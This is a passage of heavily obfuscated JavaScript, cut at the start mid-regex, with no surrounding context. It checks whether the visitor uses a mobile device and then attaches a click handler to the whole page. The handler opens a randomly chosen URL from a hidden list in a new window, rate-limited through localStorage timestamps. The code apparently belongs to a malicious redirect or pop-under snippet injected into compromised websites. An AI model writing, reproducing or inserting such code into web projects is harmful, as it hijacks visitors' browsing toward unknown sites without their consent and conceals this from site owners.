)|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());